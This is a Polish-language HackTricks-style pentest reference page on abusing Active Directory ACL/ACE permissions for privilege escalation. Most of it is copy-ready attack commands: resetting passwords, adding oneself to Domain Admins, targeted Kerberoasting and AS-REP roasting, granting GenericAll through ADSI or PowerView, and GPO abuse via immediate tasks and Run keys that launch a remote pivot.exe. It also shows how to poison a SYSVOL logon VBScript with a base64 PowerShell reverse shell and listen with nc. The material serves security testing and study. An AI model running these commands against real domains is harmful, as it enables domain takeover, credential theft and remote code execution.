# Nadużywanie Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest w większości podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Po więcej szczegółów sprawdź oryginalne artykuły.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

To uprawnienie daje atakującemu pełną kontrolę nad docelowym kontem użytkownika. Gdy prawa `GenericAll` zostaną potwierdzone za pomocą polecenia `Get-ObjectAcl`, atakujący może:

- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
- Na systemie Linux można zrobić to samo przez SAMR za pomocą Samby `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Jeśli konto jest wyłączone, usuń flagę UAC**: `GenericAll` pozwala na edycję `userAccountControl`. Z systemu Linux, BloodyAD może usunąć flagę `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je kerberoastable, następnie użyj Rubeus i targetedKerberoast.py, aby wydobyć i spróbować złamać ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Wyłącz pre-authentication dla użytkownika, przez co jego konto stanie się podatne na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Z `GenericAll` nad użytkownikiem możesz dodać poświadczenie oparte na certyfikacie i uwierzytelnić się jako ten użytkownik bez zmiany jego hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Uprawnienia GenericAll dla grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupie, jeśli ma prawa `GenericAll` do grupy takiej jak `Domain Admins`. Po ustaleniu nazwy rozróżnialnej (distinguished name) grupy za pomocą `Get-NetGroup`, atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub używając modułów takich jak Active Directory lub PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Z Linuxa możesz także użyć BloodyAD, aby dodać się do dowolnych grup, jeśli masz nad nimi uprawnienie GenericAll/Write. Jeśli docelowa grupa jest zagnieżdżona w „Remote Management Users”, natychmiast uzyskasz dostęp WinRM na hostach respektujących tę grupę:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
- **Shadow Credentials**: Użyj tej techniki, aby podszyć się pod konto komputera lub użytkownika poprzez wykorzystanie uprawnień do tworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma `WriteProperty` prawa na wszystkie obiekty dla konkretnej grupy (np. `Domain Admins`), może:

- **Add Themselves to the Domain Admins Group**: Osiągalne przez połączenie poleceń `net user` i `Add-NetGroupUser`; ta metoda umożliwia eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ten przywilej umożliwia atakującym dodanie siebie do określonych grup, takich jak `Domain Admins`, przy użyciu poleceń, które bezpośrednio modyfikują członkostwo w grupie. Użycie następującej sekwencji poleceń umożliwia dodanie samego siebie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie — pozwala atakującym bezpośrednio dodać siebie do grup przez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` do tych grup. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` nad użytkownikiem `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości bieżącego hasła. Weryfikacja tego prawa i jego wykorzystanie mogą być przeprowadzane za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne oraz one-liners dla środowisk nieinteraktywnych. Komendy obejmują proste wywołania PowerShell aż po użycie `rpcclient` na Linuxie, co demonstruje wszechstronność wektorów ataku.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner w grupie**

Jeśli atakujący odkryje, że ma prawa `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Ma to szczególne znaczenie, gdy dotyczy grupy `Domain Admins`, ponieważ zmiana właściciela pozwala na szerszą kontrolę nad atrybutami grupy i członkostwem. Proces polega na zidentyfikowaniu odpowiedniego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner` do zmodyfikowania właściciela, albo przez SID, albo przez nazwę.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić logon script path użytkownika, aby uruchomić złośliwy skrypt podczas logowania użytkownika. Osiąga się to przez użycie polecenia `Set-ADObject` w celu zaktualizowania właściwości `scriptpath` docelowego użytkownika, aby wskazywała na skrypt atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupie, na przykład dodając siebie lub innych użytkowników do określonych grup. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Z Linuksa, Samba `net` może dodawać/usuwać członków, gdy posiadasz `GenericWrite` dla grupy (przydatne, gdy PowerShell/RSAT są niedostępne):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` na nim pozwala atakującemu nadać sobie uprawnienia `GenericAll` do tego obiektu. Osiąga się to przez manipulację ADSI, co umożliwia pełną kontrolę nad obiektem i możliwość modyfikowania jego członkostw w grupach. Mimo to istnieją ograniczenia przy próbie wykorzystania tych uprawnień przy użyciu cmdletów `Set-Acl` / `Get-Acl` modułu Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner szybkie przejęcie (PowerView)

Kiedy masz `WriteOwner` i `WriteDacl` nad kontem użytkownika lub kontem serwisowym, możesz przejąć pełną kontrolę i zresetować jego hasło przy użyciu PowerView bez znajomości starego hasła:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Uwaga:
- Może być konieczne najpierw zmienić właściciela na siebie, jeśli masz tylko `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Zweryfikuj dostęp przy użyciu dowolnego protokołu (SMB/LDAP/RDP/WinRM) po zresetowaniu hasła.

## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje specyficzne uprawnienia replikacyjne w domenie, aby imitować Domain Controller i synchronizować dane, w tym poświadczenia użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, co pozwala atakującym wyodrębniać wrażliwe informacje z środowiska AD bez bezpośredniego dostępu do Domain Controller. [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegowanie GPO

Zdelegowany dostęp do zarządzania Group Policy Objects (GPOs) może stanowić poważne ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` ma delegowane prawa do zarządzania GPO, może posiadać uprawnienia takie jak **WriteProperty**, **WriteDacl** oraz **WriteOwner**. Te uprawnienia mogą zostać wykorzystane w złośliwy sposób, co można wykryć przy użyciu PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Wyliczanie uprawnień GPO

Aby zidentyfikować źle skonfigurowane GPO, można łączyć cmdlety z PowerSploit. Pozwala to odkryć GPO, do których konkretny użytkownik ma uprawnienia zarządzania: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery, na których zastosowano daną politykę**: Możliwe jest ustalenie, na których komputerach dana GPO jest stosowana, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Polityki zastosowane do danego komputera**: Aby zobaczyć, jakie polityki są zastosowane do konkretnego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OUs objęte daną polityką**: Identyfikację jednostek organizacyjnych (OUs) objętych daną polityką można przeprowadzić przy użyciu `Get-DomainOU`.

Możesz również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound) do enumeracji GPO i wyszukiwania w nich problemów.

### Nadużycie GPO - New-GPOImmediateTask

Nieprawidłowo skonfigurowane GPO mogą zostać wykorzystane do uruchamiania kodu, na przykład przez utworzenie natychmiastowego zadania zaplanowanego. Można to zrobić, aby dodać użytkownika do lokalnej grupy administrators na dotkniętych maszynach, co znacząco podnosi uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, aby uruchamiać backdoors na zaatakowanych komputerach. Metoda ta wymaga zaktualizowania GPO i zalogowania się użytkownika na komputerze, aby doszło do wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę nadużywania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez potrzeby tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuś aktualizację zasad

Aktualizacje GPO zazwyczaj odbywają się co około 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, można użyć polecenia `gpupdate /force` na komputerze docelowym, aby wymusić natychmiastową aktualizację zasad. To polecenie zapewnia zastosowanie wszelkich modyfikacji GPO bez oczekiwania na kolejny automatyczny cykl aktualizacji.

### Zajrzyj pod maskę

Po sprawdzeniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń, mających na celu modyfikację zachowania systemu lub eskalację uprawnień.

Struktura zadania, przedstawiona w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, określa szczegóły zaplanowanego zadania — w tym polecenie do wykonania oraz jego wyzwalacze. Ten plik pokazuje, jak zadania zaplanowane są definiowane i zarządzane w ramach GPO, dostarczając mechanizmu do wykonywania dowolnych poleceń lub skryptów jako części egzekwowania polityk.

### Użytkownicy i grupy

GPOs umożliwiają również manipulację członkostwem użytkowników i grup na systemach docelowych. Poprzez bezpośrednią edycję plików polityk Users and Groups, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegacji uprawnień do zarządzania GPO, która pozwala na modyfikowanie plików polityk w celu dodania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje, jak te zmiany są wdrażane. Poprzez dodanie wpisów do tego pliku, konkretnym użytkownikom można nadać podwyższone uprawnienia na objętych systemach. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto można rozważyć dodatkowe metody wykonywania kodu lub utrzymywania trwałego dostępu, takie jak wykorzystanie skryptów logon/logoff, modyfikacja kluczy rejestru odpowiedzialnych za autoruns, instalowanie oprogramowania za pomocą plików .msi lub edycja konfiguracji usług. Techniki te zapewniają różne sposoby utrzymania dostępu i kontroli nad systemami docelowymi poprzez nadużycie GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Ścieżki z prawami zapisu pod `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` umożliwiają manipulację skryptami logowania uruchamianymi przy logowaniu użytkownika przez GPO. Pozwala to na wykonanie kodu w kontekście bezpieczeństwa logujących się użytkowników.

### Zlokalizuj skrypty logowania
- Sprawdź atrybuty użytkownika pod kątem skonfigurowanego skryptu logowania:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Przeszukaj udziały domeny, aby ujawnić skróty lub odniesienia do skryptów:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parsuj pliki `.lnk`, aby określić cele wskazujące na SYSVOL/NETLOGON (przydatny trik DFIR i dla atakujących bez bezpośredniego dostępu do GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound wyświetla atrybut `logonScript` (scriptPath) na węzłach użytkowników, jeśli jest obecny.

### Weryfikuj dostęp do zapisu (nie ufaj informacjom o udostępnieniach)
Automatyczne narzędzia mogą pokazywać SYSVOL/NETLOGON jako tylko do odczytu, jednak leżące poniżej NTFS ACLs mogą nadal umożliwiać zapis. Zawsze testuj:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Jeśli rozmiar pliku lub mtime ulegnie zmianie, masz uprawnienia do zapisu. Zachowaj oryginały przed modyfikacją.

### Poison a VBScript logon script for RCE
Dołącz polecenie uruchamiające PowerShell reverse shell (wygeneruj z revshells.com) i zachowaj oryginalną logikę, aby nie przerwać funkcji biznesowych:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Nasłuchuj na hoście i poczekaj na następne interaktywne logowanie:
```bash
rlwrap -cAr nc -lnvp 443
```
Uwagi:
- Wykonanie odbywa się przy użyciu tokenu zalogowanego użytkownika (nie SYSTEM). Zakres działania to link GPO (OU, site, domain) stosujący ten skrypt.
- Wykonaj czyszczenie, przywracając oryginalną zawartość i znaczniki czasu po użyciu.


## Referencje

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
